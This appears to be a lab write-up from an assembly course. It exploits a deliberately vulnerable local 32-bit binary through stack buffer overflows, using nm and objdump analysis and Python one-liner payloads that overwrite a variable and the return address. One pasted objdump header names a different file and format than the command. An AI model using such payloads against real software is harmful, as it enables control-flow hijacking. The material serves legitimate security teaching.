# We use the IOCLA virtual machine.

# We compile the executables.
$ make
cc -Wall -g -m32 -fno-PIC -fno-stack-protector -Wno-unused-function -mpreferred-stack-boundary=2   -c -o vuln.o vuln.c
cc -m32 -no-pie  vuln.o   -o vuln

# We determine the function and variable addresses in the executable.
$ nm ./vuln
[...]
08049215 T main
080491a7 t secret_func
0804a008 r secret_message
08049182 t secret_param_func
[...]

# secret_func is at address 0x080491a7
# secret_param_func is at address 0x08049182
# secret_message is at address 0x0804a008

# We disassemble the object file to determine the buffer offset.
$ objdump -d -Mintel vuln.o


bo_exploit.obj:     file format pe-i386


Disassembly of section .text:

00000000 <secret_param_func>:
   0:	55                   	push   ebp
   1:	89 e5                	mov    ebp,esp
   3:	81 7d 08 78 56 34 12 	cmp    DWORD PTR [ebp+0x8],0x12345678
   a:	75 16                	jne    22 <secret_param_func+0x22>
   c:	81 7d 0c 01 ef cd ab 	cmp    DWORD PTR [ebp+0xc],0xabcdef01
  13:	75 0d                	jne    22 <secret_param_func+0x22>
  15:	68 20 00 00 00       	push   0x20
  1a:	e8 fc ff ff ff       	call   1b <secret_param_func+0x1b>
  1f:	83 c4 04             	add    esp,0x4
  22:	90                   	nop
  23:	c9                   	leave  
  24:	c3                   	ret    

00000025 <secret_func>:
  25:	55                   	push   ebp
  26:	89 e5                	mov    ebp,esp
  28:	68 34 00 00 00       	push   0x34
  2d:	e8 fc ff ff ff       	call   2e <secret_func+0x9>
  32:	83 c4 04             	add    esp,0x4
  35:	90                   	nop
  36:	c9                   	leave  
  37:	c3                   	ret    

00000038 <visible_func>:
  38:	55                   	push   ebp
  39:	89 e5                	mov    ebp,esp
  3b:	83 ec 44             	sub    esp,0x44
  3e:	c7 45 fc 42 42 42 42 	mov    DWORD PTR [ebp-0x4],0x42424242
  45:	68 42 00 00 00       	push   0x42
  4a:	e8 fc ff ff ff       	call   4b <visible_func+0x13>
  4f:	83 c4 04             	add    esp,0x4
  52:	a1 00 00 00 00       	mov    eax,ds:0x0
  57:	50                   	push   eax
  58:	68 80 00 00 00       	push   0x80
  5d:	8d 45 bc             	lea    eax,[ebp-0x44]
  60:	50                   	push   eax
  61:	e8 fc ff ff ff       	call   62 <visible_func+0x2a>
  66:	83 c4 0c             	add    esp,0xc
  69:	8d 45 bc             	lea    eax,[ebp-0x44]
  6c:	50                   	push   eax
  6d:	68 5e 00 00 00       	push   0x5e
  72:	e8 fc ff ff ff       	call   73 <visible_func+0x3b>
  77:	83 c4 08             	add    esp,0x8
  7a:	81 7d fc 5a 5a 5a 5a 	cmp    DWORD PTR [ebp-0x4],0x5a5a5a5a
  81:	75 0d                	jne    90 <visible_func+0x58>
  83:	68 72 00 00 00       	push   0x72
  88:	e8 fc ff ff ff       	call   89 <visible_func+0x51>
  8d:	83 c4 04             	add    esp,0x4
  90:	90                   	nop
  91:	c9                   	leave  
  92:	c3                   	ret    

00000093 <main>:
  93:	55                   	push   ebp
  94:	89 e5                	mov    ebp,esp
  96:	68 84 00 00 00       	push   0x84
  9b:	e8 fc ff ff ff       	call   9c <main+0x9>
  a0:	83 c4 04             	add    esp,0x4
  a3:	e8 90 ff ff ff       	call   38 <visible_func>
  a8:	b8 00 00 00 00       	mov    eax,0x0
  ad:	c9                   	leave  
  ae:	c3                   	ret    

# buffer is at ebp-0x44
# local variable is at ebp-0x4
# return address is at ebp+4
# variable offset is 0x44-0x4 = 0x40
# return address offset is 0x44+4 = 0x48


# We use the Python exploit scripts to determine each exploit.

# Overwrite the local variable. Print message "Comm-link online."
python3 payload_local_var.py | ./vuln
python3 -c 'import os; os.write(1, 0x40*b"A" + b"\x5a\x5a\x5a\x5a")' | ./vuln

# Overwrite return address. Print message "Channel open."
# nm vuln +> & of secret func is 0x080491a7
python3 payload_secret_func.py | ./vuln
python3 -c 'import os; os.write(1, 0x48*b"A" + b"\xa7\x91\x04\x08")' | ./vuln

# Overwrite return address with function parameters. Print message "Systems functional."
# get &secret_param_func from nm vuln| grep func 
python3 payload_secret_param_func.py | ./vuln
python3 -c 'import os; os.write(1, 0x48*b"A" + b"\x82\x91\x04\x08" + 0x04*b"B" + b"\x78\x56\x34\x12" + b"\x01\xef\xcd\xab")'| ./vuln

# Print secret_message by overwriting with address of puts() function. Print message "Acknowledged H.Q."
python3 payload_secret_message.py | ./vuln
python3 -c 'import os; os.write(1, 0x48*b"A" + b"\x50\x90\x04\x08" + 0x04*b"B" + b"\x08\xa0\x04\x08")' | ./vuln
